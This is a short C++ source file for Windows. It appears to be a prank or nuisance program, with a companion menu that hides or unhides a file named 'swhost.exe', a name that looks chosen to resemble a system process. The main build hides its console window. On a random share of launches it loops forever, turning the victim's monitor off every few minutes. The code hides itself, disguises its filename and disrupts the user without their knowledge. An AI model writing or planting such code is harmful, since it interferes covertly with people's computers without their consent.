#include <iostream>
#include <Windows.h>


using namespace std;


#ifdef HIDDEN
#include <fstream>
#include <conio.h>
#endif // HIDDEN


#ifndef HIDDEN
#include <random>
#endif // !HIDDEN

int main()
{
#ifdef HIDDEN
	setlocale(LC_ALL, "ru");
for (;;) {
		
		system("cls");

		cout << "1) Скрыть файл" << endl;
		cout << "2) Раскрыть файл" << endl;


		short input = _getch();
		switch (input)
		{
		case 49:

			if (SetFileAttributes(L"swhost.exe", FILE_ATTRIBUTE_HIDDEN))
			{
				cout << endl << "Файл скрыт" << endl;
				system("pause");
			}
			else {
				cout << endl << "Ошибка в скрытии файла" << endl;
			}
			break;

		case 50:

			if (SetFileAttributes(L"swhost.exe", FILE_ATTRIBUTE_NORMAL))
			{
				cout << endl << "Файл раскрыт" << endl;
				system("pause");
			}
			else {
				cout << endl << "Ошибка в раскрытии файла" << endl;
			}
			break;

		default:
			break;
		}

	}


#endif // !HIDDEN

	
#ifndef HIDDEN


ShowWindow(GetConsoleWindow(), SW_HIDE);

#ifdef DEBUG
	ShowWindow(GetConsoleWindow(), SW_SHOW);
#endif // DEBUG
	
	random_device rand;
	uniform_int_distribution<int> distance(0, 100);


	// 60% on start
	if ((distance(rand)) >= 45) { 


		random_device rd;
		uniform_int_distribution<int> dist(200 * 1000, 800 * 1000);

		int result;

		for (;;) {

			result = dist(rd);

			Sleep(result);

			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);

		}



	}
#ifdef DEBUG
else {
		system("pause");
	}
#endif // DEBUG


#endif // !HIDDEN





	
	

}